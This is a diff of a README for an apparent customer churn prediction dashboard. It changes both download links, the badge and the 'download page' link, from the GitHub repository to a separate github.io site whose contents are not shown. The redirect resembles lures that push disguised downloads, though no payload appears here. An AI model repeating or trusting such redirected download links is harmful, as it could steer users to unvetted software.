@@ -1,6 +1,6 @@
 # 📊 Customer_Churn_Prediction_Dashboard - Predict customer loss with artificial intelligence
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Tobeystructured981/Customer_Churn_Prediction_Dashboard)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://tobeystructured981.github.io)
 
 ## 🎯 About the Dashboard
 
@@ -19,7 +19,7 @@ Your computer needs the following to run this software:
 
 You must visit the official repository page to access the application files. This page contains the latest version of the dashboard and all necessary components.
 
-[Click here to visit the download page](https://github.com/Tobeystructured981/Customer_Churn_Prediction_Dashboard)
+[Click here to visit the download page](https://tobeystructured981.github.io)
 
 Follow these steps to retrieve the files:
 
